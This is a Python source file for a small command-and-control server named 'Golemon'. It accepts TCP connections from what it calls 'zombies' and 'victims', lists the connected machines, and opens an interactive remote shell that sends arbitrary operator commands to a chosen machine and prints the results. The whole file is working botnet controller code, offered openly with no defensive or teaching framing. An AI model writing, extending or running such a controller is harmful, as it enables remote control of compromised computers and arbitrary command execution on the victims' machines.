import socket 
import threading

agents = []
lock = threading.Lock()

HOST = 'localhost'
PORT = 9003
    
def accept_cons(server):
    while True:
        client,addr = server.accept()
        u = client.send(b'uname -r')
        hostname = client.recv(1024).decode()
        with lock:
            agents.append((client,addr,hostname))
            print(f"\n[+] Zombie connected: {addr[0]}:{addr[1]}")
            
def list_agents():
    if len(agents) == 0:
        print("[+] No active zombies")
        return 0
    with lock:
        i = 0
        print("[+] Listing all the active zombies")
        for (sockobj, addr, hostname) in agents:
            print(f'[{i}] {hostname}@{addr[0]}:{addr[1]}')
            i = i +1
            
def shell(index):
    if index+1 > len(agents):
        print(f"[+] Zombie with id {index} not found")
        return 0
    agent = agents[index][0]
    addr = agents[index][1]
    hostn = agent.send(b'uname -r')
    hostname = agent.recv(1024).decode()
    try:
        while True:
            cmd = input(f'{hostname}$ ').encode()
            if cmd.decode() =='exit':
                return 0
            agent.send(cmd)
            print((agent.recv(1024)).decode())
    except:
        print(f"Lost connection with {hostname}@{addr[0]}")

def main():
    print("[x] Welcome to Golemon a c2 server build in python")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.bind((HOST,PORT))
    s.listen(50) #listen for 50 victim 
    print(F"[+]C2 server listening on port {PORT}")
    threading.Thread(target=accept_cons, args=(s,), daemon=True).start()
    
    # print("Usage")
    # print("1. list to list all the zombies")
    # print("2. Use select <id> to select the zombie")
    while True:
        inps = input("Golemon# ")
        if inps == 'list':
            list_agents()
        elif 'select' in inps:
            shell(int(inps[7]))
        elif inps == 'exit':
            print("Exiting. . . ....")
            break
            
    
if __name__ == '__main__':
    main()
